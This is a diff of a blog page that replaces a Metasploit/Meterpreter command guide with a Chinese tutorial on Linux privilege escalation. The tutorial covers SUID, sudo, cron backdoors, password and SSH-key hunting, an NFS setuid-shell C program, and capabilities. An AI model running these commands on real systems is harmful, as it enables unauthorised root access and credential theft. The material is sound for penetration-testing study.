@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Metsploit,Tookit,">
+  <meta name="keywords" content="Privilege Escalation,">
 
 
 
@@ -86,20 +86,18 @@
 
 
 
-<meta name="description" content="Metsploit基本方法、实用技巧总结...">
-<meta name="keywords" content="Metsploit,Tookit">
+<meta name="description" content="本文总结Linux环境下权限提升思路及方法...">
+<meta name="keywords" content="Privilege Escalation">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Metsploit实用指南">
-<meta property="og:url" content="https://l0n9w4y.cc/posts/16803/index.html">
+<meta property="og:title" content="Linux提权姿势总结">
+<meta property="og:url" content="https://l0n9w4y.cc/posts/29809/index.html">
 <meta property="og:site_name" content="L0n9w4y">
-<meta property="og:description" content="Metsploit基本方法、实用技巧总结...">
+<meta property="og:description" content="本文总结Linux环境下权限提升思路及方法...">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/msfarch2.png">
-<meta property="og:updated_time" content="2022-07-31T12:04:14.537Z">
+<meta property="og:updated_time" content="2022-08-01T14:07:21.570Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Metsploit实用指南">
-<meta name="twitter:description" content="Metsploit基本方法、实用技巧总结...">
-<meta name="twitter:image" content="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/msfarch2.png">
+<meta name="twitter:title" content="Linux提权姿势总结">
+<meta name="twitter:description" content="本文总结Linux环境下权限提升思路及方法...">
 
 
 
@@ -129,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="https://l0n9w4y.cc/posts/16803/">
+  <link rel="canonical" href="https://l0n9w4y.cc/posts/29809/">
 
 
 
 
 
-  <title>Metsploit实用指南 | L0n9w4y</title>
+  <title>Linux提权姿势总结 | L0n9w4y</title>
   
 
 
@@ -314,7 +312,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/16803/">
+    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/29809/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="L0n9w4y">
@@ -331,7 +329,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Metsploit实用指南</h1>
+          <h1 class="post-title" itemprop="name headline">Linux提权姿势总结</h1>
         
 
         <div class="post-meta">
@@ -343,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-18T21:01:43+08:00">
-                2018-06-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-06-11T22:21:26+08:00">
+                2021-06-11
               </time>
             
 
@@ -368,6 +366,17 @@
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/红队渗透/" itemprop="url" rel="index">
                     <span itemprop="name">红队渗透</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/红队渗透/权限提升/" itemprop="url" rel="index">
+                    <span itemprop="name">权限提升</span>
                   </a>
                 </span>
 
@@ -403,31 +412,273 @@
       
 
       
-        <center>Metsploit基本方法、实用技巧总结...</center>
+        <center>本文总结Linux环境下权限提升思路及方法...</center>
 
 <a id="more"></a>
 <hr>
-<h2 id="0x01-基本介绍"><a href="#0x01-基本介绍" class="headerlink" title="0x01 基本介绍"></a>0x01 基本介绍</h2><h3 id="1-架构图"><a href="#1-架构图" class="headerlink" title="1. 架构图"></a>1. 架构图</h3><p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/msfarch2.png" alt></p>
-<h3 id="2-目录结构"><a href="#2-目录结构" class="headerlink" title="2. 目录结构"></a>2. 目录结构</h3><p><strong>源码结构</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">├── bin</span><br><span class="line">│   ├── msfbinscan</span><br><span class="line">│   ├── msfconsole</span><br><span class="line">│   ├── msfd</span><br><span class="line">│   ├── msfdb</span><br><span class="line">│   ├── msfelfscan</span><br><span class="line">│   ├── msfmachscan</span><br><span class="line">│   ├── msfpescan</span><br><span class="line">│   ├── msfremove</span><br><span class="line">│   ├── msfrop</span><br><span class="line">│   ├── msfrpc</span><br><span class="line">│   ├── msfrpcd</span><br><span class="line">│   ├── msfupdate</span><br><span class="line">│   └── msfvenom</span><br><span class="line">├── embedded</span><br><span class="line">│   ├── bin</span><br><span class="line">│   ├── framework</span><br><span class="line">│   ├── include</span><br><span class="line">│   ├── lib</span><br><span class="line">│   ├── share</span><br><span class="line">│   └── ssl</span><br><span class="line">├── LICENSE</span><br><span class="line">├── LICENSES</span><br><span class="line">├── version-manifest.json</span><br><span class="line">└── version-manifest.txt</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-SUID提权"><a href="#0x01-SUID提权" class="headerlink" title="0x01 SUID提权"></a>0x01 SUID提权</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><pre><code>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限。</code></pre><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li>Linux命令查找SUID文件</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; 2&gt;/dev/null \;</span><br><span class="line">find / -uid 0 -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><strong>Metasploit框架</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1）framework目录</span><br><span class="line"></span><br><span class="line">$ tree -L 1 /opt/metasploit-framework/embedded/framework</span><br><span class="line">.</span><br><span class="line">|-- config      //metasploit的环境配置信息，数据库配置信息</span><br><span class="line">|-- data        //存放meterpreter，exploits，wordlists等数据信息</span><br><span class="line">|-- external    //metasploit的一些基础扩展模块</span><br><span class="line">|-- lib         //metasploit的一些基础类和第三方模块类</span><br><span class="line">|-- modules     //metasploit模块</span><br><span class="line">|-- msfconsole  //metasploit的基本命令行</span><br><span class="line">|-- msfd        //metasploit服务</span><br><span class="line">|-- msfrpc      //metasploit的服务端</span><br><span class="line">|-- msfrpcd     //持久性的metasploit本地服务，可以给远程用户提供rpc服务以及其他的http服务</span><br><span class="line">|-- msfupdate   //metasploit更新模块</span><br><span class="line">|-- msfvenom    //集成了msfpayload和msfencode的功能，效率更高</span><br><span class="line">|-- plugins     //metasploit的第三方插件接口</span><br><span class="line">|-- scripts     //存放一些msf用到的脚本，如meterpreter，ps，resource，shell</span><br><span class="line">|-- tools       //第三方脚本工具</span><br><span class="line"></span><br><span class="line">2）Metasploit模块</span><br><span class="line"></span><br><span class="line">$ tree -L 2 /opt/metasploit-framework/embedded/framework/modules</span><br><span class="line">.</span><br><span class="line">|-- auxiliary    //辅助模块:包含端口扫描器、嗅探器、fuzzers、暴力破解等</span><br><span class="line">|-- encoders     //编码器模块:对payload进行编码加密，绕过杀软</span><br><span class="line">|-- evasion      //检测规避模块</span><br><span class="line">|-- exploits     //漏洞利用模块:对某些可能存在漏洞的目标进行漏洞利用</span><br><span class="line">|-- nops         //空指令模块:不影响进程运行的空命令或无关命令，用于填充</span><br><span class="line">|-- payloads     //攻击载荷:攻击成功后在目标机执行的代码，如反弹shell、bind shell等</span><br><span class="line">`-- post         //后渗透模块:用于内网渗透</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>使用find命令以root权限命令执行</li>
+</ol>
+<p>Linux可以使用的命令提权姿势</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#Find</span><br><span class="line">find pentestlab -exec whoami \;</span><br><span class="line"></span><br><span class="line">#Vim</span><br><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">#awk</span><br><span class="line">awk &apos;BEGIN&#123;system(&quot;whoami&quot;)&#125;&apos;</span><br><span class="line"></span><br><span class="line">#curl</span><br><span class="line">curl file:///etc/shadow</span><br><span class="line"></span><br><span class="line">#Bash</span><br><span class="line">bash -p  </span><br><span class="line"></span><br><span class="line">#Less</span><br><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">#Nmap</span><br><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x02-常用命令"><a href="#0x02-常用命令" class="headerlink" title="0x02 常用命令"></a>0x02 常用命令</h2><h3 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1. 基础命令"></a>1. 基础命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息</span><br><span class="line">exploit - 漏洞利用 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">check - 检查目标是否可漏洞利用</span><br><span class="line">grep - 匹配指定内容</span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-SUDO提权"><a href="#0x02-SUDO提权" class="headerlink" title="0x02 SUDO提权"></a>0x02 SUDO提权</h2><h3 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>sudo是linux系统管理指令，允许系统管理员让普通用户执行一些或者全部的root命令，如halt，reboot，su等等。sudo不是对shell的一个代替，它是面向每个命令的。</p>
+<p>它的特性主要有这样几点：</p>
+<ul>
+<li>sudo能够限制用户只在某台主机上运行某些命令。</li>
+<li>sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。</li>
+<li>sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。</li>
+<li>sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440。</li>
+</ul>
+<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li>免密码执行sudo配置</li>
+</ol>
+<p>linux ALL=(ALL) ALL<br>说明：linux用户可以从  ALL终端作为  ALL（任意）用户执行，并运行  ALL（任意）命令。</p>
+<ol start="2">
+<li>查看sudo权限</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep -v -E &quot;^#&quot; /etc/passwd 2&gt;/dev/null| awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -v -e &apos;^$&apos; /etc/sudoers 2&gt;/dev/null |grep -v &quot;#&quot; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">echo &apos;&apos; | sudo -S -l -k 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p><strong>命令示例</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; grep http search mysql</span><br><span class="line"></span><br><span class="line">msf &gt; search name:mysql  //根据名称搜索</span><br><span class="line"></span><br><span class="line">msf &gt; search platform:linux  //搜索指定平台模块</span><br><span class="line"></span><br><span class="line">msf &gt; search type:post  //根据auxiliary, post, exploit等模块类型进行搜索</span><br><span class="line"></span><br><span class="line">msf &gt; search cve:2019 type:exploit platform:linux  //组合搜索</span><br><span class="line"></span><br><span class="line">msf exploit(3proxy) &gt; sessions -l    //列出活动的会话</span><br><span class="line"></span><br><span class="line">msf exploit(3proxy) &gt; sessions -i 1   //指定会话ID进行交互</span><br><span class="line"></span><br><span class="line">msf exploit(3proxy) &gt; sessions -s checkvm -i 2-4  //在指定会话上执行脚本</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-Meterpreter命令"><a href="#2-Meterpreter命令" class="headerlink" title="2. Meterpreter命令"></a>2. Meterpreter命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background  放回后台</span><br><span class="line">meterpreter &gt; exit  关闭会话</span><br><span class="line">meterpreter &gt; help  帮助信息</span><br><span class="line">meterpreter &gt; Sysinfo系统平台信息</span><br><span class="line">meterpreter &gt; screenshot  屏幕截取</span><br><span class="line">meterpreter &gt; shell  命令行shell (exit退出)</span><br><span class="line">meterpreter &gt; getlwd  查看本地目录</span><br><span class="line">meterpreter &gt; lcd  切换本地目录</span><br><span class="line">meterpreter &gt; getwd  查看目录</span><br><span class="line">meterpreter &gt; ls 查看文件目录列表</span><br><span class="line">meterpreter &gt; cd  切换目录 </span><br><span class="line">meterpreter &gt; rm  删除文件 </span><br><span class="line">meterpreter &gt; download /data/1.txt 1.txt 下载文件</span><br><span class="line">meterpreter &gt; upload /var/www/wce.exe wce.exe  上传文件</span><br><span class="line">meterpreter &gt; search -d c:  -f *.doc  搜索文件</span><br><span class="line">meterpreter &gt; execute -f  cmd.exe -i   执行程序/命令 </span><br><span class="line">meterpreter &gt; ps  查看进程</span><br><span class="line">meterpreter &gt; run post/windows/capture/keylog_recorder   键盘记录</span><br><span class="line">meterpreter &gt; getuid  查看当前用户权限</span><br><span class="line">meterpreter &gt; use priv  加载特权模块</span><br><span class="line">meterpreter &gt; getsystem  提升到SYSTEM权限</span><br><span class="line">meterpreter &gt; hashdump  导出密码散列</span><br><span class="line">meterpreter &gt; ps   查看高权限用户PID</span><br><span class="line">meterpreter &gt; steal_token &lt;PID&gt;  窃取令牌</span><br><span class="line">meterpreter &gt; rev2self  恢复原来的令牌 </span><br><span class="line">meterpreter &gt; migrate pid  迁移进程</span><br><span class="line">meterpreter &gt; run killav  关闭杀毒软件 </span><br><span class="line">meterpreter &gt; run getgui-e  启用远程桌面</span><br><span class="line">meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发</span><br><span class="line">meterpreter &gt; run get_local_subnets  获取内网网段信息</span><br><span class="line">meterpreter &gt; run autoroute -s &lt;内网网段&gt;  创建自动路由</span><br><span class="line">meterpreter &gt; run autoroute -p  查看自动路由表</span><br><span class="line">创建代理通道:</span><br><span class="line">msf &gt; use auxiliary/server/socks4a   设置socks4代理模块</span><br><span class="line">msf auxiliary(socks4a) &gt; show options </span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br></pre></td></tr></table></figure>
-
-<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul>
-<li><p><a href="https://metasploit.help.rapid7.com/docs" target="_blank" rel="noopener">https://metasploit.help.rapid7.com/docs</a></p>
+<h2 id="0x03-计划任务提权"><a href="#0x03-计划任务提权" class="headerlink" title="0x03 计划任务提权"></a>0x03 计划任务提权</h2><h3 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如果未正确配置Cron，则可以利用它获得root特权。</p>
+<ol>
+<li>cron作业中是否有可写的脚本或二进制文件？</li>
+<li>我们可以覆盖cron文件本身吗？</li>
+<li>cron.d目录可写吗？</li>
+</ol>
+<p>Cron通常以root特权运行。如果我们可以成功修改cron中的任何脚本或二进制文件，那么我们可以使用root权限执行任意代码。</p>
+<h3 id="2-漏洞利用-2"><a href="#2-漏洞利用-2" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li><p>查看计划任务，找到有修改权限的计划任务脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/cron*</span><br><span class="line">more /etc/crontab</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><a href="https://github.com/rapid7/metasploit-framework/wiki" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/wiki</a></p>
+<li><p>在mysqlback.sh 添加 SUID shell后门，当定时任务以root再次执行的时候，可以获取root权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure>
+
 </li>
-<li><p><a href="https://www.offensive-security.com/metasploit-unleashed/introduction/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/introduction/</a></p>
+</ol>
+<h2 id="0x04-密码复用提权"><a href="#0x04-密码复用提权" class="headerlink" title="0x04 密码复用提权"></a>0x04 密码复用提权</h2><h3 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>如数据库、后台 web 密码，其他配置文件出现的密码，可能就是 root 密码</p>
+<h3 id="2-漏洞利用-3"><a href="#2-漏洞利用-3" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul>
+<li>检查弱密码</li>
+<li>检查Web服务器连接到数据库的文件（config.php或类似文件）</li>
+<li>检查数据库以获取可能被重用的管理员密码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">grep --color=auto -rnw &apos;/&apos; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; /dev/null \;</span><br><span class="line"></span><br><span class="line">strings /dev/mem -n10 | grep -i PASS</span><br><span class="line"></span><br><span class="line">locate password | more</span><br><span class="line"></span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</span><br><span class="line"></span><br><span class="line">find / -name authorized_keys 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find / -name id_rsa 2&gt; /dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-NFS提权"><a href="#0x05-NFS提权" class="headerlink" title="0x05 NFS提权"></a>0x05 NFS提权</h2><h3 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。<br>Root Squashing参数阻止对连接到NFS卷的远程root用户具有root访问权限。远程root用户在连接时会分配一个用户“ nfsnobody ”，该用户具有最小的本地权限。如果 no_root_squash 选项开启的话的话”，并为远程用户授予root用户对所连接系统的访问权限。</p>
+<h3 id="2-漏洞利用-4"><a href="#2-漏洞利用-4" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ol>
+<li><p>查看配置文件/etc/exports</p>
 </li>
+<li><p>kali挂载远程目录</p>
+</li>
+<li><p>在/tmp/test文件夹下创建c文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line">#include &lt;sys/types.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt; </span><br><span class="line">int main() &#123; setuid(0); system(&quot;/bin/bash&quot;); return 0; &#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc suid-shell.c -o suid-shell</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>回到目标主机/tmp目录下执行suid-shell</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +s suid-shell</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>执行</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./suid-shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-Capabilities利用"><a href="#0x06-Capabilities利用" class="headerlink" title="0x06 Capabilities利用"></a>0x06 Capabilities利用</h2><h3 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>linux中Capabilities的概念和suid类似，可以让普通用户授予超级用户的能力</p>
+<p><strong>Capabilities表</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">capability名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">CAPAUDITCONTROL</td>
+<td align="left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
+</tr>
+<tr>
+<td align="left">CAPAUDITREAD</td>
+<td align="left">允许通过 multicast netlink 套接字读取审计日志</td>
+</tr>
+<tr>
+<td align="left">CAPAUDITWRITE</td>
+<td align="left">将记录写入内核审计日志</td>
+</tr>
+<tr>
+<td align="left">CAPBLOCKSUSPEND</td>
+<td align="left">使用可以阻止系统挂起的特性</td>
+</tr>
+<tr>
+<td align="left">CAP_CHOWN</td>
+<td align="left">修改文件所有者的权限</td>
+</tr>
+<tr>
+<td align="left">CAPDACOVERRIDE</td>
+<td align="left">忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td align="left">CAPDACREAD_SEARCH</td>
+<td align="left">忽略文件读及目录搜索的 DAC 访问限制</td>
+</tr>
+<tr>
+<td align="left">CAP_FOWNER</td>
+<td align="left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
+</tr>
+<tr>
+<td align="left">CAP_FSETID</td>
+<td align="left">允许设置文件的 setuid 位</td>
+</tr>
+<tr>
+<td align="left">CAPIPCLOCK</td>
+<td align="left">允许锁定共享内存片段</td>
+</tr>
+<tr>
+<td align="left">CAPIPCOWNER</td>
+<td align="left">忽略 IPC 所有权检查</td>
+</tr>
+<tr>
+<td align="left">CAP_KILL</td>
+<td align="left">允许对不属于自己的进程发送信号</td>
+</tr>
+<tr>
+<td align="left">CAP_LEASE</td>
+<td align="left">允许修改文件锁的 FL_LEASE 标志</td>
+</tr>
+<tr>
+<td align="left">CAPLINUXIMMUTABLE</td>
+<td align="left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
+</tr>
+<tr>
+<td align="left">CAPMACADMIN</td>
+<td align="left">允许 MAC 配置或状态更改</td>
+</tr>
+<tr>
+<td align="left">CAPMACOVERRIDE</td>
+<td align="left">忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td align="left">CAP_MKNOD</td>
+<td align="left">允许使用 mknod() 系统调用</td>
+</tr>
+<tr>
+<td align="left">CAPNETADMIN</td>
+<td align="left">允许执行网络管理任务</td>
+</tr>
+<tr>
+<td align="left">CAPNETBIND_SERVICE</td>
+<td align="left">允许绑定到小于 1024 的端口</td>
+</tr>
+<tr>
+<td align="left">CAPNETBROADCAST</td>
+<td align="left">允许网络广播和多播访问</td>
+</tr>
+<tr>
+<td align="left">CAPNETRAW</td>
+<td align="left">允许使用原始套接字</td>
+</tr>
+<tr>
+<td align="left">CAP_SETGID</td>
+<td align="left">允许改变进程的 GID</td>
+</tr>
+<tr>
+<td align="left">CAP_SETFCAP</td>
+<td align="left">允许为文件设置任意的 capabilities</td>
+</tr>
+<tr>
+<td align="left">CAP_SETPCAP</td>
+<td align="left">参考 capabilities man page</td>
+</tr>
+<tr>
+<td align="left">CAP_SETUID</td>
+<td align="left">允许改变进程的 UID</td>
+</tr>
+<tr>
+<td align="left">CAPSYSADMIN</td>
+<td align="left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
+</tr>
+<tr>
+<td align="left">CAPSYSBOOT</td>
+<td align="left">允许重新启动系统</td>
+</tr>
+<tr>
+<td align="left">CAPSYSCHROOT</td>
+<td align="left">允许使用 chroot() 系统调用</td>
+</tr>
+<tr>
+<td align="left">CAPSYSMODULE</td>
+<td align="left">允许插入和删除内核模块</td>
+</tr>
+<tr>
+<td align="left">CAPSYSNICE</td>
+<td align="left">允许提升优先级及设置其他进程的优先级</td>
+</tr>
+<tr>
+<td align="left">CAPSYSPACCT</td>
+<td align="left">允许执行进程的 BSD 式审计</td>
+</tr>
+<tr>
+<td align="left">CAPSYSPTRACE</td>
+<td align="left">允许跟踪任何进程</td>
+</tr>
+<tr>
+<td align="left">CAPSYSRAWIO</td>
+<td align="left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td>
+</tr>
+<tr>
+<td align="left">CAPSYSRESOURCE</td>
+<td align="left">忽略资源限制</td>
+</tr>
+<tr>
+<td align="left">CAPSYSTIME</td>
+<td align="left">允许改变系统时钟</td>
+</tr>
+<tr>
+<td align="left">CAPSYSTTY_CONFIG</td>
+<td align="left">允许配置 TTY 设备</td>
+</tr>
+<tr>
+<td align="left">CAP_SYSLOG</td>
+<td align="left">允许使用 syslog() 系统调用</td>
+</tr>
+<tr>
+<td align="left">CAPWAKEALARM</td>
+<td align="left">允许触发一些能唤醒系统的东西(比如 CLOCKBOOTTIMEALARM 计时器)</td>
+</tr>
+</tbody></table>
